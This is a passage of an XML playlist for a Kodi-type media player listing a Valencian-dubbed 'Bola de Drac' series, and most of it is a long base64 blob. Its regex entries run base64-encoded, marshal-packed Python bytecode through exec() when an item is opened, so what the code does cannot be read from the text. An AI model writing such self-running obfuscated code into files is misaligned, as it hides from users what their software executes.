W5sb2JrZFhhRVl5TlRKWU1IZzFTRWxPTkVkVVRHbFpNbWRGV2toRlFscFJjVFpCUjA5aVdtdzRiRmt3T0cxQlVYRnRjVWROVTBZd1dteEdkbWRGVFZWWFQweElhMk54UjAxcFNFZzRNbGt3VXpGd2JEbDJibnBCVlc5UVoyMUdWREZGV2tkeFpVMUdabWxNZWpWdGNVbzRhVXd3TUdsQlVWZElSRXBKV1c1SFFXZEJSMDFuV0RKVE5rRlFPWGRGYlhGUlNVaFRTVXd3Wm1wQlVYQnBXVEowYTNCdFNXVnhNMEZKY1VsTmRtOWhWMmxCVTBsVFFraGFOVVZSVTFGTWQwMVRjVzExVVhCc1oycFpNakJyU21GUGJFZFFPR2x1U0VsMVdrbE1aVUY0TURWSlMzbE5SVzE0YVVGVWNHcEZiVVZyUkRKQmJIQmhRVEJFWVhCcFFsUk1hMEZTVFZGd2RqbFVjREpUZVVwSFQzaElWRTEzU1Vwd1pVWXhlRFJDVUdkUFdUQXhiVzlKU0RCR2VsSnNjRlJGVlZrelkyMUpTbE4xV1RGTmEwUnRWMWRCVURsdFRWSm5ZMWt5TVdGQmQxcHBXREJ4WTBKS05XcFpNa1ZqVFVkYWFVRXpWekZ2VWxkTGIyMXdOVVJIUVZseVUzRlpUWGN3WVZGRVl6WnVTamxvVmxFd2RGY3hhelJCYlZkd2NsRk5la3RWZEROQlUyczBXbTFUY0hKUldtMVhhakJZYjNwSmFWWlJNSFJOUzAxMWIxQjBZVXRWZERKYWVXczBRWGQ1Y0hKUlRYbExWWFF5V2tsck5FRnRRWEJ5VVV4dFMxVjBNa0pKYXpSQmQzbHdjbEZYZVV0VmRETkJTV3MwUVhwSmNISlJURFJMVlhReVFVbHJORUZ0ZFhCeVVVMTNTMVYwTWtKSmF6UkJkMDF3Y2xGd05VdFZkR3hDVTJzMFFYcEZjSEpSVFhwTFZYUXpXbmxyTkVGdFQzQnlVVXcwUzFWME1rRkphelJCYlVsd2NsRndiVXRWZEd4Q1NXczBXbmRPWVZoR1RtVldWRWt5VEVwcVlsY3hhelJCZDBGd2NsRk5la3RWZERKQlUyczBRWGRKY0hKUlRHMUxWWFF6V2pGck5GcDZTWEJ5VVV3d1MxVjBNa0ZKYXpSQmQwRndjbEZOZWt0VmRESkJVMnMwUVhkSmNISlJWalJMVlhRelFWTnJORUZ0VjNCeVVVdzFTMVYwTWsxSmF6UkJkM2x3Y2xGd01FdFZkRE5DU1dzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFWk9aVlpVU1RKTVNtcGlWekZyTkVGM1YzQnlVVXcxUzFWME1rMUphelJCZDFOd2NsRndiVXRWZERKYU1XczBRWGQ1Y0hKUlREVkxWWFJzVFVsck5FRnRTWEJ5VVUxNVMxVjBNa0pUYXpSQmQwbHdjbEZ3TkV0VmRESk1NV3MwUVhkNWNISlJUREpMVlhRelFrbHJORnAzZFhCeVVVMTZTMVYwTTFwNWF6UkJkMU53Y2xGTWJVdFZkREpNTVdzMFFYZEpjSEpSVmpWWGJIaDBXR3hQZVhGNlUyWllVSEZ3Y2xGTWJVdFZkREpOZVdzMFFYZEZjSEpSVERGTFZYUXlXakZyTkVGdFFYQnlVVmQ1UzFWME1rRlRhelJCZDBsd2NsRk1iVXRWZERKTmVXczBRWGRGY0hKUlRERkxWWFJzUWxOck5FRjZWM0J5VVV3eFMxVjBNMEpKYXpSQmVrVndjbEZNYTB0VmRESk1lV3MwUVhkSmNISlJjR3hMVlhSc1dsTnJORnA2UVhCeVVWWnFTMVYwTTB4SmF6UkJkM2x3Y2xGTmVrdFZkREpOU1dzMFduZDRZVmhFTUZoTlMwMTFiMUIxZDI4eU1XcHVTbXQ1V0ZWalptNUtWbWhOVkVsM2J6SXhhbkI2U1cxd2JIVjJURXRCZVVGM1JHaE1kMHd3VFZSSmQyOHlSWGxZVkVreVRFcHFZbGN4YXpSQmVrbHdjbEZNTVV0VmRESk5kbkJqV0VaNFpsZHRhMjF4VlZkamIzcHdLMWRzYW1GTlMzVjVUR3h3WTFoRVBUMTBCUUFBQUhKdmRERXpjd2tBQUFCdGIzSndhR1YxY3lCekhBQUFBR052WkdWamN5NWtaV052WkdVb2RISnBibWwwZVN3Z2VtbHZiaWwwQmdBQUFHOXlZV05zWlhNZUFBQUFZMjlrWldOekxtUmxZMjlrWlNoclpYbHRZV3RsY2lBc0lIcHBiMjRwZEFNQUFBQnVaVzl6Q0FBQUFEeHpkSEpwYm1jK2RBUUFBQUJsZUdWaktBc0FBQUIwQmdBQUFHSmhjMlUyTkhRR0FBQUFZMjlrWldOemRBZ0FBQUJ0YjNKd2FHVjFjM1FIQUFBQWRISnBibWwwZVZJRUFBQUFkQWdBQUFCclpYbHRZV3RsY25RRUFBQUFlbWx2Ym5RRUFBQUFaWFpoYkZJRkFBQUFkQWNBQUFCamIyMXdhV3hsZEFrQUFBQmlOalJrWldOdlpHVW9BQUFBQUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUUlBQUFBUEcxdlpIVnNaVDRCQUFBQWN3NEFBQUFZQVFZQkJnRUdBUVlCQmdFcUFRPT0iKSkp"))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_temporadas</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_temporadas.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_capitulos]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_series.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>cristal_capitulos</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_capitulos.param2][/COLOR]</title>
<thumbnail>[cristal_temporadas.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[url]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
parametro = '[cristal_temporadas.param1]'
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>url</name>
<expres><![CDATA[#$pyFunction
url = '[cristal_capitulos.param1]'
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<thumbnail>https://i.imgur.com/ivX08il.jpg</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
</item>
-->
--------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR white]Bola de Drac [COLOR orange]Valencià [COLOR yellow][/COLOR]</title>
<link>$doregex[cristal_series]</link>
<regex>
<name>cristal_series</name>
<listrepeat><![CDATA[
<title>[COLOR white][cristal_series.param2][/COLOR]</title>
<thumbnail>[cristal_series.param3]</thumbnail>
<fanart>https://i.imgur.com/0D8Ft2R.jpg</fanart>
<link>$doregex[cristal_temporadas]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,resolveurl,xbmc,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MGZRNEFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2VsRXpUbFJTYlUxNlVYcFBSRmsxVGxSSk1rNXFWWGxOZW1zeVRucEtiVTU2UlRCT1ZGRjVUbFJCZWs1NlZYaE9SMVV3VG5wak0wNTZVVEpPVkdOM1RrUm5NRTlVVW1wT1ZHTXdUWHBOTlU1RVJUQmFWRlY2VG0xSk0wOVVVbWxPYWtVeFdWUlZNVTU2V1RCT1ZGa3pUbnBGTUU1VVl6Sk9SMWt5VDFSVk5VNTZSVEpaZWxVMVRrUnJNbGxxVlROT1IwVjZUVlJTYUU1VVRUQlphbHBxVFhwWmVWcHFXVEpPYWsxNlRWUlNhazVVV1RKTmFsVTBUbnBWTTA1NlZUTk9SMWt6V1ZSUk1FNTZZekpQVkZrMVRtMVpNVTE2VlROT1YwVXdUbnBqTkU1NlZURk9hbEV4VGxkRk1GbFVaR2hPZW1ONVdtcFNiVTV0VlRCWmVrMHdUbGRGTTA5RVdUSk9WR2N5VG5wTk1FNTZXVEZQUkUweFRYcFpNRTlFVlRSTmVrMTVXbXBOTVUxNlFYcE9WRmt3VGtSWmVrNUVZekpOZW1ONlRtcGpOVTE2V1hsWmFrcHRUa1JuTUZwcVl6Sk9iVkV5VFhwYWJFMTZUWGxhYWswMFRucEpNMWxVU20xTmJWa3lUbXBSZUU1NlkzbFphbGt3VG5wTk1VOUVZM2xPZWsweVQwUktiVTF0V1hsYWFsVXpUbFJuZVZscVdteE9SMFV6VGtSTmVrNXFZM3BPYWsxNlRYcE5lazU2U20xTmVtZDZUa1JOTkU1NlVURlBSRkpyVG1wTk0wOUVWWGRPTWtWNVdtcFZORTU2UlRCUFZFMTZUa2RaZWsxNldtcE9WR2N3VGtSTk5VNTZSVEZOYWsxNFRtcFZNVTE2WXpGT1JGa3lXV3BhYTAxNldUSlpWRlV3VG0xTk1scFVXWGxPVkdzd1dsUlNhMDE2YXpGTlJFMDBUWHBSZVZwcVRUUk9SR2N3VFdwV2FFNTZRVE5PYWxWNVRtcHJNMWxVVW1oT1IxVXhUbnBSZWsxNlkzbGFhbEp0VGtSbk1WbFVTbTFPYWxGNlRVUmpORTVFWTNsYWFrMHhUbXBKTUU1VVZYcE9iVlY2VFZSU2FFNVVUWGxhYWxVMVRYcEZlVnBxWkdoT2JVVXdXbXBLYVU1NlFUSk5lbFV6VG5wRk0wNTZUVEZOYlZsNlRYcFdhRTE2YXpCWmVtTXhUWHByTTA1VVRUVk9WR2N6V1ZSak0wNVhSVE5OVkZKb1RYcGplazU2V210T2VtY3hUWHBqZUU1SFNYcE5lazE0VGxSWk1rOVVWbWhPUjBsNlRYcGpNRTV0UlROTmFtTXdUbnByTUZwVVdtbE9WR3Q2VG1wTk1VNUhUVE5OZWxrd1RucGpNbGw2VlhkT1YwVXlXa1JqTVU1dFNUTk5hbU16VG5wWk1rNUVZelZPVkdzelRYcFpORTVxU1RCT2VsbDRUbnBaTVUxcVkzbE9SMWt4VFdwWmVVNXFSVE5OVkZrelRqSkZlazU2V21wT1ZGbDZUVVJWTlU1cVJURlpWRkpvVFhwTk1GbHFUVEZPZWxrelRtcFZNVTF0U1hwT2VsVXlUWHBGZWsxNldYaE9SMWw2VDFSV2FFNVVZekZOYWsxNVRtcFpNazU2U21sT1ZGa3pUV3BqZDA1SFVUTk9lbHByVGtSak1VNXFXWGxPUkVVelRucE5NVTU2V1ROTmFtTTBUa1JKTWs5RVkzZE9ha1V3V21wVk1VNXFTVEZPZW1ONFRrZFZNMWxVV1ROT2Vsa3lXbFJOTWs1Nlp6Tk5WRnB0VG1wTk1sbHFZelZOZWtVeFRtcFpNVTU2VlRGUFZFMHlUbFJKTWxsNll6Vk9iVlV3V2xSTmQwNVVZekZPVkZsNVRtMU5NMDlVWXpGT2FrbDVXV3BrYUU1VWF6SlpWRTE2VG0xSk1GbDZXVEpPZWtGNlRsUlNhazVxWXpGWlZFMTNUbTFGTUZsVVRUTk9WR042VDFSVk1VNXFaekphVkdNd1RrZFZNMDlFVlRKT1ZGRXpUWHBOTUU1RVRYbGFhbHB0VG0xUk1sbDZWbWhPYlVreVdrUk5NRTVxVFRKWlZHUm9UWHBGTTAxcVdYbE9SRlV5VGxSS2FVNTZSVEZOYWswMVRucHJNMDVFVlRST2JWRXdUa1JTYVU1VVNYbFphbEUwVG1wTmVrMVVZM2xPZWsweVRWUmplazVVWnpCWmVscHFUbnByTWs5RVVYaE9lbWQ2VDFSYWFrNVVXVEpQUkUwd1RsUlJNazlVV1RGT2VtTXdUWHBLYlU1cVNUSlphazE1VG0xUk0wMVVWVEZOYlVrelRYcGpkMDVIV1RCWlZFMHlUbnBOTTA5RVdUUk9SRkV6V1ZSVk5VNUhVVEZPZWswd1RYcEJNMDlVVVRWT2FsRXpUa1JOTWs1WFJUQk5lbFV5VGtSVk0wNXFWbWhPYWtrd1dWUmpNRTVYUlRCYVJHTjZUa1JWZWs5VVZYZE9iVWw2VG1wak5FNXFSVEpaVkZsNlRsUmplazVFVlRCT2Vsa3pUbnBaZUU1SFVUTk5hbEY1VGxSQk1rNXFWVFZPYWxGNVdtcFZlRTU2U1RGT2FsSnRUWHBKTWxsNldUTk5lazB6VFVSamVFNUhWVEJhUkUwd1RrZEplazlVVlhwT2JVVXdUa1JqTkU1cVdUQlphbU15VG0xVmVrNUVXWHBOZWtVd1dtcFplazV0VFhwT1ZFMTZUbnBWZVZscVkzcE9SRmt3V21wTk1VNVVSVEpPYWxab1RucGplazVFU20xT2JWRXdUbnBqTWs1RVl6Qk5lbFUwVGtSbk1GcHFWVEpPZW1Nd1RrUk5NMDVxUlRCYVJGcHBUbTFaTVU1RVRYcE5lbGt3VGxSak1rNTZXWHBOVkZKc1RsUkJNbHBVV21wT1ZGa3pUbnBWZDA1cVdUTk9lbFY0VGxSRk0wMVVUVFZOZW1jeVdXcFJNMDVIV1RCT2FrMDFUWHBGTWs1NlVtcE9WRUV5VGtSU2EwNTZhekJhYW1Nd1RrUlpNMDVxWTNwT1JGa3hUVVJOTVU1WFJUTlpWRlV5VGtSak1rOVVVVEZOYlVrd1RtcE5lazE2UlRCTmVsRXdUWHBOZVZscVdtdE5lazB3VDFSS2JVNTZhekpaVkZWNlRYcG5NazFVV21oT2FtY3lXV3BOTUU1dFRYbGFhbEUxVGtkRmVrNUVZM2RPUjFreFRucGFhMDU2WTNwTmVtTjVUWHBSTUZwcVdURk5la0V6VFVSU2FrMTZRVE5PVkZrMVRrUlZNMDVxWTNsT2JWbDZUMFJSZUU1NldYcFBSRmt6VFhwak1rOVVVbXRPYlZFelRucGFhazE2UVROTlJFMDFUWHBuZWs1cVl6Sk9SR3N3V2tSak1FMTZSVEJOVkZwcFRucG5NVTE2VlRCT1ZHc3hUa1JaTkU1VWF6QmFhbEV4VFhwak0wOUVUWHBPYlZreVdXcFJOVTE2YTNwT1JGRTBUbTFOTWs1RVRYbE9hbXN3VGtSVk0wNUVUVEpPUkdOM1RsUk5NMDU2VlRSTmVrRXdXbFJOTkUxNldUSlplbFV5VGtSTk0wNVVTbWxPUkZVeFRVUmpORTVFYXpGTlJFMHdUbnBqTVU5RVdtMU9lbEV4VFhwak5VNVVVVEpaYWxKdFRYcGpNRTE2V1hsT2VsVXdXa1JhYTA1cVp6QlBSRXB0VG5wck1VMUVXbWxOYlVsNVdtcGpORTVFVlROT1JGRjRUbnBaTUU5RVRYaE9ha2w2VDBSUk1FNXFhek5PZWxrMFRtcEpNMDVFVVhwT1IwMHlUWHBWTTA1RVl6QmFSRTB3VG1wSmVrOUVZelJPUjFWNlRYcGFhVTVIV1hsYWFtTjZUbXBGZWsxVVkzbE9hbFV6VDBSVk1VNXFUVEZPYWxwdFRtMU5NRTVFWXpGT1Iwa3lUa1JqTTA1cWEzcFBSRTB3VGtkTmVrNVVVVEZPYWtVeVRYcFZOVTV0VVROWlZHTjNUVzFaTVUxcVdUSk9WMFV5V2tSVmQwNUVXVEZPZWxKc1RrUlZNVTlFWXpOT1JHTXdXbXBaTkU1WFJUSk9hbGw1VGtkTk1scEVUVEpPZW1jeFRrUmpORTU2UVRKYVJFMHdUbXBuTUU1cVNtMU9iVWt6VG5wUk1FMTZSWHBOZWxreVRrUkZNRTlVVFhwT1ZHc3pXVlJOTVU1NmF6Rk5SRXB0VGxSUk1scHFXVEZPUkZGNlRucFpOVTVVV1ROTmVsSm9UbnBaZWsxcVVtdE9hazB5VFhwU2FVNUVZekJOYW1NeVRsUlpNazlVVW0xT2FsVXpUbnBSTkU1VVdUQk9lbHBzVGtkUk1FOVVXbXhOZWtVd1RsUmpNRTU2UlRKTlZGVXhUa1JyZWs5RVVtMU9SRmt5VG5wUk1FNTZWWHBQUkdONlRtcE5lVmxxV1ROT1JGRXdUMFJOZDA1RVNUSk9hazB4VG1wak1GbDZXVE5PYW1jelQwUmpNRTVVVFRKYVZGRjVUbTFWTVU5VVZUQk5la2t3VFZSUmVrMXRXVEZOZWxKdFRsUkZNRTFxU20xT1Iwa3hUbFJSTUU1VVVYcE5SRmt5VFhwWk1sbDZXVEpPVkdzeVRucE5NMDE2WXpGTmVrMTNUa1JKTUU5VVRUSk9WRlV6VG1wTk1rNUVWVEZQUkdSb1RucGpNVTVFV1RGT2VrMHhUV3BOTkUxNlVUTlBSRTB6VG0xSk1sbDZWVFZOZWxFeVdtcE5ORTVFWTNsWmFsRXlUWHBOZWs1RVkzbE9Na1V3VGxSS2FVNVVSVEphVkUxM1RtcFJNMDFFV21wT1JHY3pUa1JSZUU1RVZUTlBSRlV4VG5wVk0wNVVVVEZPYWxFelRtcFplazU2U1RCYVJGSnJUWHBaZWs5RVVUTk9SMWt5V1dwVk1FNUhXVEpOVkZVeVRtcE5NMDlVVVRGT1JFbDVXV3BqZDAxNmF6Qk5lbEpxVFcxSk1WbFVXbXhPVkUweFQwUmplazVVUlRKWlZGWm9UWHByZWs1RVVtMU9iVWt4VFVSU2JVNUhSVEJPZWswMFRucEZNRTlFVlRST2VtY3dUMFJhYkU1NlNUQlBWRlY2VFcxWmVrNTZTbTFPYW1ONVdtcE5ORTU2UVRKT1JFMHlUbnBKZWsxNlZUVk9SMWw1V21wU2FrNXFVVEJOYWxwc1RucEZNazU2VFRST2FtY3pUbXBOTkU1SFRYcE9WRkV5VFhwbmVrNUVZM2RPVkdkNlRrUldhRTE2WnpOUFZGSnJUa2RGTWxsVVZUUk9WRmt3VFhwS2JVNUVXVEJOYW1NeVRYcFJNMDFFVlRSTmVsa3dUMVJWTkUxNlp6Rk5lbFY2VFhwVk1GcEVVbWxPUkZWNlQwUmFiVTF0U1hwT1JHTjZUbnBSTVUxVVRUUk9WRlV3VFhwTk5FNUhSVEpPYWxWM1RsZEZNRmxVV1RCT1YwVXdUa1JOTVU1SFJUTk9hbFY0VG0xTk1FNUVZek5OZW1Nd1dWUlJOVTE2V1RGT1ZGRTBUbnByTVU5RVkzbE9hbXN6VGxSUk1VNXFZM3BOZWswd1RtcGpNazFxVFRCT2VsRXpUWHBLYlU1SFVUTk5SRTB6VGtSRk1GcHFTbWxPUkdzeVRXcFJOVTV0UlhwUFJFMTVUa2RaTUU1VVdYcE9lbXN6V1ZSamVrNVVSVEJOVkdONlRrZE5NVTVFVlhsTmVtTXpXVlJaTlU1RVVUQlBSRkp0VGxSTk1FNXFZM2RPUjAwelRucFplRTVIV1RKUFZGa3hUbFJGTVU5VVl6Uk9hbGt3VFZSTmVrNXFXVEpOVkZKc1RtcFpNbGxxVlRCTmVtY3dUbFJSTlU1cVVUSlBWRlY1VGtSSmVrMUVXWGhOZWxrd1QwUktiVTE2WnpKYVJHTXlUbFJKZWs5VVdUUk9iVTE1V21wVk1VNUVZekpPUkZWNFRtMUZlazVVVVRKT1ZFMTZUMVJSTTA1VVdURlBSRkp0VGxSRmVWcHFTbWxPUjFGNlQwUmpkMDVFVFRKT2FsbDRUVzFKTUZscVl6Uk9SMDB3VGxSa2FFNVVWVE5OVkVwcFRrZFZNbHBVWXpKT1ZGVXdXWHBOTlU1NlZUTk9WRmt4VGtSSk0wMVVZM2ROYlVrelRYcGFhMDVVUlRKYVZFMTRUbXBuTUZsNlRUVk9lazB3VFdwS2JVMTZWVEJOYWsxNlRucFJNazVFVVhwT1ZGa3pXVlJaZUU1SFZUTlpWRkUwVFcxWk1scEVVbTFOYlZrd1RucFJNRTF0U1RCYVZGcHNUbnBqTVZsVVRYZE9SMFY1V21wU2FVNUhWWHBOYWxwc1RXMVpNRmwwZlE0QUFHMWFNa0YzZURCQ1VWcHRRWGRNTTBGdFJHMWFlbFl6V20xd2JVRjNSREZhZDAxNFFWUlNiVUZSV2pCYWJWWXhRVzF3YlVGSFZtMUJVVTEyUVcxNE1FeDNSWGhCUjFwdFFrZHdNRUYzU0ROYWJYQnJRVEpTTTBGdFRESmFlbFl5V20xSU5VRjNXakJhUjNBd1dtMUlNVUZSV2pGQmJWWXlRVkZGZVZwNlRERmFiVWd3UVRKU01scDNjR3hCTWxJeFFsRklORnA2VmpOYWQwUTBXbTFhTUZwSFREUkJWRWd4UVhkSWJVRjNSREJNZDB3MFFVZGFNazFIVFhwQmQxSXpRa2RFTVVGSGNHMUNSMFJzUVhwSU0wRnRjRE5CYlV3d1RVZE1iVnA2VmpOYVVWcHFRVzEwYkV4M1JYWkJNbEl5V25kd2JFRlJTREJOVVUxM1dtMUVNa3hIUkRKQmQxSXpRWGRFYTFwNlZqRmFSMHd4V20xTU1rSlJWM3BCYlVRd1FrZFhkbHB0UkRCQmJWb3hRWHBFTVVKUmNHeEJWRWd5UVhkSU1VRlJURzFhUjB3MVdtMUliVUZSV20xQlNsSXhRVWRNTUVGdFJERmFSMW8wUVhkMGJWcHRTREpCUjNBeVRWRndNa0YzVEcxQmJVMTZRVWQ0TUZwSFYzcEJlbFl4UWxGWGRrRlJjREZhUjNGMVFXMXdNa0pSUlhkYWJWSXlUVkZFTkZwdFREQk1kMW8wUVZSV00wRkhSREpCUjA0elFsRkliRUY2VWpOQ1IwZzFRVkZNYlVGM2NEVkJlbEp0UVZGTWJVRlJSRzFDVVUxM1FWUkVNVnAzY0d0QmVrd3pRWGR3TkVGUldqTkJkMFJzUVZSRU1rRjNTR3hhYlhReldrZElNa0ZSZUd4TWQwUTFRVkZ3TWtGM1dqSkJSMDR6UVVkTWExcDZUREZCVVUxNVFYcEVNMEZIVjNaQlZGSnNUWGRhTUVGSFJHMWFSMGhxV20xME1WcEhWM1phYlZJeldrZElNVUZVU0cxQ1Iwd3hRVlJXYlVKSFJYbEJVVm95VFhkWGVrRnRTRE5CZDBoclducE1iVnB0VEROQlIwNHlRWGR3YlVGUlVqSkJkMW95UVZGNE0xcHRUREZCVkZJeFdrZGFOVnB0UkRCTWJWbzBRVkZhYkUxM1JYcEJWRVJzVEhkYU5WcHRWak5hYlhCc1dtMUlNRUpSVEd4YWVsWXpXbmRNTVVGSFNETk1SMGd4UVhkME0wSlJTR3BCZWtnd1FVZE1NRnB0VGpOYWQweHRRVlJFTTBGM1RESkJla3d4UWtkYU5WcHRSREZCZDNCcVFXMVNNMXBIU0dwQmJWWXdRbEZYZGtGdFVqQk1SM0JyUVcxU2JVSlJUWGhCYlZJeldsRmFORUZIV2pKTWJVdzFRVkZFTWxwdFYzWkJSM2d5VEVkTWEwRnRlREJOUjFvMFFXMTRNVUpSY0RWQmJWb3lXa2RFYTFwNlRETkJVVVF6V25wV01VSlJTRFJCUjNSdFdtMWFOVnB0U0ROQmQzQTBXbTF3TVZwUmNEUmFla3d5UVVkRWJFRkhURzFCYlhBd1FXMVdNVUYzV210QmVrZ3lRVkZFTTFwdGVEQk1iVnByUVZSSU1GcHRjREpCU2xJeVdrZE5kMEYzVWpGQ1IwZ3dRVWRhYlZwdFNEUmFiVkl5VFZGSU1FRkhkRzFhUjBWNVFYcFdNVUpIVEd0QlVVZ3dRVWR3TUVGM1ZqSk1iVWcxUVVkYU1rMVJSWFZCZWtoaFVVUmpNSEI2ZVdodVMwVTFWbEV3ZEZjeVNWVnZNVXd5U25wSlRXOTZTWGh2VkdKcWIzZEJVRXhLVTBOQ1IwazJiM2RTYTI5dFFUTkVSM2xDVFRKck1IRXlaMWhhVlZwcldqRmlhbkpoZFV4RU1FRmtibm93TTBwaFNWRnVTRk5xYmtoVFZYSlRTVmxHU1hGYVJVbzFWMjh5VXpWd1NqbDJRWGhyUjAxSFJETnZTbGRMU0VwNVNrbElUVTlOTWtsaVJWTlhZVVpJZFVsYWVFRlBjSGd3TWtFeVRYbElTa2xGUkhwTk1rMUhRV1JhZWtneFRFaFhSWEJMVG1wTU1rUTFXREphTTBKU2NYaEpWVTFSVEhsSlVVWlFaMnBhZDA5VmNIcDFZVWRJT1dkeVlWTjNXbUZCVmxwSWFtMUtlWGxSUlZSRmVHNTZkVEJJYkdkVlJtRjFRMEpIVFV0dVMwRlJSakIwWlZvd1JURnVTbEl3YjB0WFMzQklVekZ4TUdOSVNWVjFRWEJIVDFCd1IwMWlUVEE1UVZwU1UxRmFlbWQzUkd3NGEzRXdZMHhCYlhWa1NFdDRNRWhMWTBWd01VOTViekk1UTI1VVkyUktlazE0U0RJd01tOVJUV05HU2xKclRWUk1NSEZSVG1wTVlVUnFRVEJuTVUxM1VqRkdiVXhsYmxKNWJrVlJkVVZhZVhsaVNEQkJhbHBTZFd0dVUxZHFRWGxTYlVoVlNHdHVZVUZrYmxWWGEwWkdPVTlDVWt4cGNrZFRNbHB0UVZCSGVYbGhUREE0TlVKSWNXdGFlRk5aYjJGMGFVMHdNWGR3UzBGbGNsTkVNMHBMZVdodlIzRllTbmR4Wm5CNWNYWkVZWFJwV2xGd01GcFJTV3hKTTNReFNrZzFTMFl6U1hoeGVtZGlXbFJOYlVVd01HbGFWV0pzY21GQlJHNUhWMnBJTVhReWIwbzRha1pMY1ZCSU0wbDFXak5YYUhGSWNVcEVTRmRFUkROVE0zSkxSV2xLU21OTmNXMUVhMjVLTVhod2JYbHVibEpuVjI0elUyVk5NM1V5UWxORWFVeElTVlZGU2sxSlNuZFNNVUpJU1doSWJWTjFjVXByYkc1SlJYaHdVWEZpU25oME0xaHRRVXRCUzFOc1JERmpORUYzVXpKQlIzRm1RbEpUYUVKSU9YVklTbUpyUmpGWE1HOTNRVTl4TWtFMVJqRnhXa2xVZUd4QlMyTlpja3RXYTBkU2VWRkVZWGx0U0VkV00yOTNkR3hFU2tsdWNIcEpXVnBVWTBSSFZHZHBSRWRFTW04eFQyTkJNVUZaY0VsRU1HOVJlVU53UjBGRVNsQTRNMDB6VjJ4S2VqbFZjVzFCZFc5NGNXVmFkMGhxYjBsVFJGa3dUV0pCU0dkVVNWRldNa1JKVjBadmVrVXljRWhYTWtoM1QyRkJTMk4xV2xGRU1GcDRTV1p4ZUhWVmIyRnhOVWRLVmpWR2JVODFja2R4TmtGUmVYVkpTbE5UUmxKMU1VZHNaMkZDVVhsaFRVWm5kbTVWZUdWQmVtSnRUVWhKTVVKVlYwdEdlRVJ0V1RONVZHOUxjVkJ5ZWtsSVJIZEJlRzVJVW1sTlZYaHJRWFk1VUhBeVdteEtWWFEwU0d3NVJGcDRZelZhZUdOcGIwbE5XRTE2TURSdVVubExia2hGTVVZd1RXZHhNbVp0VEV0TU0wUnRVMUJOU2xkUGJsQTViRXBIVDBKTVJtWTFXakp4VlVSNVRVWmFVakZzV2tkUGFrY3hRWGR5VW1OTFFUQjFUVVpSVDFsTk1rUTBiekF3YTBKSFdqTkpSMDFhV21GamFGaHRlWGhFU1U4eWNsRk1ORXBLVFUxSmVGZENXREp4UjNGNmEwbEdVVVZRUlZSeFIwd3pRV0pHU1VWbGIxTnhRVWhIZFZkRmVua3lRVEJYTVhKNGFtdEdlblZLV20xQmJIRkpUMmhIUzFONVFraDVOVUpWZFhwQmQwOVZUVXBGWWtGS05HbEdNR05xY2t0QldsaHNaMFp4YlhSc2NEQnhaRVJLWWpWYWQwOVJiMnhtTWtneU1XaEtSMEYxVFZWVFVrbFVOR1ZCVTBGNlNrZDBOVVpoZFU5Qk0zbEdjbmQxYUVKVU9USndNVXd4Y2t0QlkyOWhkV3R1TWxOR2NFaFdNMGxKVWpKYVVrbENiakp4WVZwdGNUSmFiVmMxV25wMVZHOVVlV2hHU0dwcmNVZzVXbHBMUVZWRmQxWnBjRlZNYVc5aFUzVkplRk5UY0dGaU1rSlZVMmx3ZWtobGJrZzFNMFY2Y1ZGYVZHZHVXVEpGTlVGTGVEVktVVWxEYmtwVFdFUjNkWHBCTUUxWWIwZDFhVUpLT0cxd1VtTkdSbmw1Tm05S1JVMU1TR3B0V2xGSmEyOVRjREZITURsMmIwdFBOVXBIZVU5QmJWTllibE5PYVVwaFRHbHhlbkUyYmtkQllrRkxjWFZLUzFObmNFbE5hRnBLT0RKRmQzbHNiMUZQVm05VVJWcEZZV0pwUjIxSlNrZFFPWGRNWVhGc1ducEpVRnBSVFcxTVMwVmtiakkxVkVwSmVXTnllbXRzU2xGV1pXNTZkVFJ1U0hWMVdESTFaVUpRWjB4QmVtSXlSREo1UTNKVU5XUnZTVWhzYm0xQlMxb3dWbTF3VVVWUlJEQlhZM0JSY1ZGRWVFRkZTSGRQZDNCSlRETklNWEUxUVV0WGJHNVVlV0ZCZW5sYVFYZE5NMjlLUkdwWU1tdGhXakJpTlUxSU1ETnllamxtYmtkVFRHNVFaek5JU21jeGNHMUpTMFJJUVdsSFVYbGFSRzF4WVV4TFVqVkd